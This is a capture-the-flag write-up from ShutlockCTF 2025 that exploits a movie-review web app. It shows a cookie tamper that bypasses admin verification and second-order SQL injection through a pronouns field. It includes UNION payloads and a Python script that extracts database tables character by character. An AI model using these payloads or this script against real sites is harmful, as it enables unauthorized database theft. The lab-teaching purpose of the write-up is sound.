---
title: Strange Query
author: Fozl
event: ShutlockCTF 2025
categories: [ShutlockCTF_2025, Web]
date: 2025-07-03
tags:
  - sqli
  - second-order
  - automation
  - web
info:
  description: The Cannes Festival released a fancy site to share movie reviews. It looks very new—so, a lot of vulnerabilities are expected...
  difficulty: 3
img_path: /assets/img/Writeups/ShutlockCTF_2025/Web/Strange_Query/
image:
  path: /assets/img/Writeups/ShutlockCTF_2025/shutlock2025.png
---

## Challenge Description

{{ page.info.description }}

---

## Recon & Enumeration

The site welcomes users with a playful Netflix/Letterboxd-inspired interface.

![]({{ page.img_path }}59b51bc299ed4c7db3c9983746978d27.png)

After creating an account, several features unlock:  
Profile editing, movie forums and comments, user profile browsing, and the ability to add new movies.

Editing the profile sends a straightforward POST request:

![]({{ page.img_path }}3c0ea9cd28fb417e99cf8aa04e153fe6.png)

```json
{
  "email": "sonic@sega.com",
  "pronouns": "He/Him",
  "password": ""
}
````

Browsing `/forum` displays public discussions.

![]({{ page.img_path }}fcdbfabab7674469b4d516777afe06ff.png)

On each `/movie/X` page, users can leave comments and even tag other users—though posting or adding movies requires a verified account.

![]({{ page.img_path }}5d8346950af540ce81cb1ff3d3cf157b.png)
![]({{ page.img_path }}604970e1dc6e4ddba1696ad8777a69ef.png)

User profiles are accessible at `/profile/{id}`. For example, `/profile/1` is the admin.
After locating our user ID (in this case, 12), the profile page shows a "verify" button. By default, clicking it is denied for non-admins.

![]({{ page.img_path }}106b36a45a6442aaa3066648d3599949.png)

However, a quick look at cookies reveals `is_a_cool_admin` set to `"no"`. Changing it to `"yes"` and reloading grants access to the verification feature.

With the account now verified, posting comments and creating films is allowed.

---

## Input Handling & First Exploits

The application does minimal input sanitization.
First instinct: try a DOM-based XSS to steal cookies by tagging admin in a comment and sending `document.cookie` to an external server.

This approach hits a wall:

* The session cookie is set `HttpOnly`, so JavaScript can't access it.
* The challenge specifies there's no admin bot browsing comments, killing any XSS-to-flag escalation.

---

## Parameter Tampering: Pronouns

The profile offers three default pronouns, but existing comments suggest users can display anything they want (`she/they`, `they/them`, etc).
Manually editing the JSON sent to the server allows custom values for pronouns.

![]({{ page.img_path }}0b9c74d2766a4c1abebabf5ee1f5ca90.png)

Testing with polyglot strings and then tagging the user triggers a 500 server error—looks like SQLi, possibly [second-order](https://portswigger.net/kb/issues/00100210_sql-injection-second-order).

---

## Second-Order SQL Injection Discovery

At this point, the hypothesis is that user tags in comments trigger a backend SQL query involving both username and pronouns, but without proper sanitization.

Basic probes confirm it:
Injecting payloads in the pronouns field and tagging the user causes the site to crash or behave abnormally:

```
' OR id=12 ORDER BY 1 --   (works)
' OR id=12 ORDER BY 2 --   (works)
' OR id=12 ORDER BY 3 --   (crash)
```

The error at `ORDER BY 3` reveals that two columns are selected by the SQL query.

Trying union-based injection:

```
' OR id=12 UNION SELECT null,null --
```

This works, resulting in an extra row.
Fine-tuning the payload shows the first column must be `NULL`, the second can be numeric or `NULL`.

To check how much data can be exfiltrated, try leaking the username length:

```
' UNION SELECT NULL, LENGTH(username) FROM users WHERE id=12 --
```

By tagging self with this payload in pronouns, the length (`5` for "Sonic") shows up in the comment thread.

---

## Automated Data Extraction

Reading data one byte at a time is slow, but it works.
Example payload to extract each character's ASCII value:

```
' UNION SELECT NULL, ASCII(SUBSTRING((SELECT username FROM users WHERE id=12),N,1)) --
```

For each index N, update pronouns, post a comment tagging the user, and note the output.
Obviously, automating this is the way to go.
A Python script cycles through:

* Creating a new movie for an isolated comment space
* Updating pronouns with the injection
* Posting a tag-comment
* Extracting ASCII values from responses
* Decoding characters, moving to the next position
* Stopping when the output is empty

Output looks like:

```
[1] ASCII: 83 => S
[2] ASCII: 111 => o
[3] ASCII: 110 => n
[4] ASCII: 105 => i
[5] ASCII: 99 => c
out : Sonic
```

Slow but steady, and it’s satisfying watching it reconstruct strings, table names, and columns one byte at a time.

---

## Database Enumeration

The same pattern is used to enumerate table names, using:

```
' UNION SELECT NULL, ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET X),N,1)) --
```

Adjusting the offset, table names like `users` are extracted.

Counting tables:

```
' UNION SELECT NULL, COUNT(*) FROM information_schema.tables --
```

Result: 198 tables.

Column names are enumerated via:

```
' UNION SELECT NULL, ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET X),N,1)) --
```

Results yield:
`users(id, username, pronouns, email, password, verified, is_admin)`

Attempts to change `is_admin` or read admin passwords are blocked/protected.

Further enumeration reveals tables: `movies`, `comments`, and `secrets`.

Examining `secrets` gives: `secrets(id, content, classification)`

---

## Flag Extraction

Iterating through rows and columns, extracting one character at a time, the entire `secrets` table is rebuilt:

| id | content                                              | classification                         |
| -- | ---------------------------------------------------- | -------------------------------------- |
| 1  | this\_is\_the\_flag                                  | SHLK{S3CoNd\_0RDeR\_4rEN7\_AwE50me\_?} |
| 2  | Ce challenge est fait par un étudiant épitéen.       | Secret                                 |
| 3  | La solution du challenge se trouve dans cette table. | Très secret                            |

---

## TL;DR

* Unsanitized pronouns field in user profiles leads to second-order SQL injection via comment tagging
* UNION-based payloads leak data, one character per request, using crafted pronouns and comment automation
* Automated exfiltration recovers usernames, table names, columns, and the flag
* Flag found in the `secrets` table: `SHLK{S3CoNd_0RDeR_4rEN7_AwE50me_?}`

---

## Appendix

Python script used for data exfiltration:

```python
import requests
import re
import time

BASE_URL = "http://IP:PORT"
COOKIES = {
    "is_a_cool_admin": "yes", # just in case
    "session": "eyJ....xKM"
}
HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded"
}
MAX_LEN = 100
SLEEP = 0.2

def create_dummy_movie():
    url = f"{BASE_URL}/movies/addMovie"
    from time import strftime
    data = {
        "title": strftime("%H:%M:%S"),
        "content": "a",
        "image_link": "a"
    }
    r = requests.post(url, data=data, cookies=COOKIES, headers=HEADERS)
    if r.status_code != 200:
        print(f"Error film creation: {r.status_code}")

def get_last_movie_id():
    url = f"{BASE_URL}/forum"
    r = requests.get(url, cookies=COOKIES)
    movie_ids = re.findall(r'href="/movie/(\d+)"', r.text)
    if not movie_ids:
        print("Error findings movie in /forum")
        return None
    return movie_ids[-1]

def inject_sqli(index):
    url = f"{BASE_URL}/profile"
    #payload = f"' UNION SELECT NULL, ASCII(SUBSTRING((SELECT username FROM users WHERE id=12),{index},1)) --"
    #payload = f"' UNION SELECT NULL, ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 3),{index},1)) --"
    #payload = f"' UNION SELECT NULL, ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0),{index},1)) --"
    #payload = f"' UNION SELECT NULL, ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='secrets' LIMIT 1 OFFSET 0),{index},1)) --"
    
    payload = f"' UNION SELECT NULL, ASCII(SUBSTRING((SELECT classification FROM secrets WHERE id=3),{index},1)) --"
    data = {
        "email": "",
        "pronouns": payload,
        "password": ""
    }
    r = requests.post(url, data=data, cookies=COOKIES, headers=HEADERS)
    if r.status_code != 200:
        print(f"Injection error, index {index} : {r.status_code}")

def trigger_comment(movie_id):
    url = f"{BASE_URL}/movie/{movie_id}"
    data = {
        "content": "@Sonic"
    }
    r = requests.post(url, data=data, cookies=COOKIES, headers=HEADERS)
    if r.status_code != 200:
        print(f"Erreur trigger comment {movie_id} : {r.status_code}")

def parse_tags_to_ascii_mapping(page_text):
    result = {}
    # Match tous les <p>@tag(...)</p>
    tag_blocks = re.findall(r'<p>@tag\((.*?)\)</p>', page_text, re.DOTALL)

    for tag in tag_blocks:
        current = tag.split("--")

        order_match = re.search(r".*SUBSTRING\(.*,(\d+),\d+\)\)", current[0])
        if not order_match:
            continue
        order=int(order_match.group(1))


        result_match = re.search(r'\d+', current[1])
        if not result_match:
            continue
        ascii_val = int(result_match.group())

        result[order] = ascii_val

    return result


def extract():
    create_dummy_movie()
    time.sleep(SLEEP)
    movie_id = get_last_movie_id()
    if not movie_id:
        return

    result = ""
    for i in range(1, MAX_LEN+1):
        inject_sqli(i)
        time.sleep(SLEEP)
        trigger_comment(movie_id)
        time.sleep(SLEEP)
        url = f"{BASE_URL}/movie/{movie_id}"
        r = requests.get(url, cookies=COOKIES)
        mapping = parse_tags_to_ascii_mapping(r.text)

        ascii_val = mapping.get(i, 0)
        if ascii_val == 0:
            break
        result += chr(ascii_val)
        print(f"[{i}] ASCII: {ascii_val} => {chr(ascii_val)}")

    print("out :")
    print(result)
    return result

if __name__ == "__main__":
    extract()
```
